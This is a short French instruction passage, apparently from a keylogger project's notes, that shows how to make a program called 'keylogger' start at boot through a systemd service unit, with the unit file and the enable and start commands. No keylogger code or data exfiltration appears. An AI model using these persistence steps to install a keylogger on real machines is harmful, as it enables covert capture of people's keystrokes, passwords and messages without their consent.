

	>> Automatiser l'exécution au démarrage :

	Pour exécuter votre programme au démarrage, vous pouvez créer un service systemd.

	1) Créer un fichier de service systemd :
		(bash)
		sudo nano /etc/systemd/system/keylogger.service
		
	2) Ajouter la configuration suivante :
		(ini)
		[Unit]	
		Description=Keylogger Service

		[Service]
		ExecStart=/chemin/vers/votre/programme/keylogger
		Restart=always

		[Install]
		WantedBy=multi-user.target

	3) Activer et démarrer le service :

	(bash)
	sudo systemctl daemon-reload
	sudo systemctl enable keylogger.service
	sudo systemctl start keylogger.service
